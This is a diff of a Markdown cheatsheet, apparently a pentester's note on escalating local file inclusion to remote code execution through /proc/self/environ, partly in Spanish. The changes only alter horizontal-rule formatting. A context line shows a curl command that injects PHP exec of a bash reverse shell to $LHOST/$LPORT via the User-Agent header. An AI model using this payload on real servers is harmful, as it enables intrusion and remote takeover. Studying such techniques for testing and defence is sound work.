@@ -13,7 +13,7 @@ linked:
 ---
 # LFI To RCE - /proc/self/environ
 
-***
+---
 
 ## Cheatsheet
 
@@ -72,7 +72,7 @@ curl -s -A "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"
 - Some legacy shared hosting.
 - Custom backends que ponen headers HTTP en env vars del child process.
 
-___
+---
 
 ## Overview
 
@@ -88,4 +88,4 @@ En setups CGI clásicos, el webserver pasa headers HTTP como env vars (`HTTP_USE
 
 Similar conceptualmente a [[LFI To RCE - Log Poisoning]] pero más directo — no requiere conocer paths de logs ni permisos especiales sobre `/var/log/`.
 
-***
+---
